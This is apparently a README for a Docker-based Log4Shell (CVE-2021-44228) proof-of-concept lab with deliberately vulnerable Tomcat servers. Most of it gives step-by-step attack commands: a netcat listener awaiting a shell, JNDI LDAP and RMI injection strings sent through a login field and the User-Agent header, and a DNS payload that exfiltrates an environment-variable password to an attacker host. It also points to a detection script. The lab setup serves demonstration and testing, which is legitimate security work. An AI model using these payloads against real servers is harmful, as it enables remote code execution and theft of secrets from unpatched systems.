# log4j-poc

## An LDAP RCE exploit for CVE-2021-44228 Log4Shell 

### Description

The demo Tomcat 8 server on port 8080 has a vulnerable app (log4shell) deployed on it and the server also vulnerable via user-agent attacks.

The remote exploit app in this demo is based on that found at https://github.com/kozmer/log4j-shell-poc

This demo tomcat server (Tomcat 8.5.3, Java 1.8.0u51) has been reconfigued to use Log4J2 for logging - a non-standard configuration.

A newer Bitnami server is now available on port 8888. It is also is configured for Log4J2 logging and is running Tomcat 9.0.55 and OpenJDK 11.0.13.

The RMI exploit against the Tomcat 9 / Java 11 server is described here: https://www.veracode.com/blog/research/exploiting-jndi-injections-java (Jan 3, 2019) by Michael Stepankin

The detection script will check for user-agent vulnerablities and is from here: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
 

### Prerequisites

This code requires Docker and Docker Compose

### Installation

``` 
git clone https://github.com/cyberxml/log4j-poc
cd log4j-poc
# edit docker-compose.yml to addjust the environment variables as needed.
#   POC_ADDR is the address of the cve-poc container
#   LISTENER_ADDR is the address of the 'nc' listener e.g. the docker host
# The listener IP address is the address of the machine on which you will run the netcat 'nc' listener
# This can be the local IP of the docker hostmachine.
docker-compose build
```

### Run Web App Attack Demo

1. Setup your docker listener in the first terminal
    1. `nc -lnvp 9001`
1. Start the docker containers in a second terminal
    1. `docker-compose up`
1. Navigate to the web app on port 8080
    1. Navigate to http://10.10.10.31:8080/log4shell
        1. Enter the username: `admin`
        1. Enter the password: `password`
        1. Select the "login" button
        1. See the welcome screen 
    1. Return to login at http://10.10.10.31:8080/log4shell
        1. Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
        1. Select the "login" button
        1. Check for connection on your `nc` listener

### Run a User Agent Attack Demo

1. Setup your docker listener in the first terminal
    1. `nc -lnvp 9001`
1. Start the docker containers in a second terminal
    1. `docker-compose up`
1. In a third terminal, run the following. The second IP is the docker host
    1. `curl -A "\${jndi:ldap://172.16.238.11:1389/a}" http://10.10.10.31:8080/log4shell`

### Run a DNS Exfil Demo on Recent Java 11 version

1. Start the docker containers in a terminal
    1. `docker-compose up`
1. In a second terminal, run the following. The IP is the ip address of the docker host
    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8888/log4shell/`
1. The vulnerable web server will attempt to do a TXT lookup at the given IP. See log4j-dns_exfil.pcap


### Run an RMI RCE Demo on Recent Java 11 version

I am having issues with command line arg for ping target. So you have to compile yourself.

#### Compile 
1. Start the docker containers in a terminal
    1. `docker-compose up`
1. In another terminal, Login to the cve-poc
    1. `docker exec -it log4j-poc_cve-poc_1 /bin/bash`
1. Kill running RMIServerPOC instance
1. Change to rmi-poc directory
    1. `cd /home/user/rmi-poc`
1. Edit RMIServerPOC.java to change 10.10.10.31 to your ping target
1. Recompile
    1. `javac -cp catalina.jar:. RMIServerPOC.java`
1. Run the Server
    1. `javac -cp catalina.jar:. RMIServerPOC 127.0.0.1`

#### Run RMI RCE Demo

1. Start the docker containers in a terminal
    1. `docker-compose up`
1. In a second terminal, run the following. The IP is the ip address of the docker host
    1. `curl -A "\${jndi:rmi://172.16.238.11:1097/Object}" http://10.10.10.31:8888/`
1. The vulnerable web server will download a serialized malicious class from the RMI server for a class which already exists in the Tomcat environment.
1. This will ping the IP address defined in the compile section. 


### Detect UA Vulnerability
1. cd scripts
1. `python3 log4j_rce_check.py http://10.10.10.31:8080/log4shell --attacker-host 10.10.10.31:11389 --timeout=2`
1. you will have to kill the process, not sure yet why this hangs
